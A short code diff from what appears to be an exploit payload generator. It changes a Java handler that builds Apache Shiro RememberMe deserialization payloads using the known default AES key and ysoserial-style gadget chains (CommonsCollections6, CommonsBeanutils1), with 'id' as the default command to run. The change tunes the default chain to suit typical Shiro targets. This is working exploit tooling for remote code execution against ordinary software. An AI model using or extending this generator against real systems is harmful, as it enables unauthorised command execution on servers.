@@ -28,7 +28,9 @@ public class ShiroChainHandler implements ChainHandler {
     @Override
     public PayloadResult generate(String chainId, Map<String, Object> params) throws Exception {
         String keyB64    = (String) params.getOrDefault("key_b64", "kPH+bIxk5D2deZiIxcaaaA==");
-        String innerChain = (String) params.getOrDefault("chain", "CommonsCollections6");
+        // jchains_shiro_cbc uses CB1 (Shiro targets have commons-beanutils, may not have commons-collections)
+        String defaultChain = chainId.equals("jchains_shiro_cbc") ? "CommonsBeanutils1" : "CommonsCollections6";
+        String innerChain = (String) params.getOrDefault("chain", defaultChain);
         String cmd       = (String) params.getOrDefault("cmd", "id");
         String mode      = chainId.contains("gcm") ? "GCM" : "CBC";
 
